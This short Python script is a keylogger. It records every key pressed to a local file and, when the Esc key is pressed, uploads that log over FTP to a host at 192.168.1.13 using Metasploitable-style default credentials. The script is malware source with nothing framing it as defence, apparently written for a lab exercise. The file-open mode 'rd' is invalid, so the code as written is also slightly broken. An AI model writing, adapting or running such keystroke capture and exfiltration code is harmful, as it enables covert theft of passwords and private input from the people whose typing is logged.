from pynput.keyboard import Key, Listener
import ftplib
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir+"log-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")

def pressing_key(Key):
    try:
        logging.info(str(Key))
    
    except AttributeError:
        print(f"A special key {Key} is pressed.")

def relasing_key(key):
    if key == Key.esc:
        return False

print("\nStarting listener...\n")

with Listener(on_press=pressing_key, on_release=relasing_key) as listener:
    listener.join()

print("\nConnecting to the FTP and sending the data...")

session = ftplib.FTP("192.168.1.13",'msfadmin','msfadmin')
f = open("log-res.txt",'rd')
session.storbinary("STOR log-res.txt",f)
f.close()
session.quit()
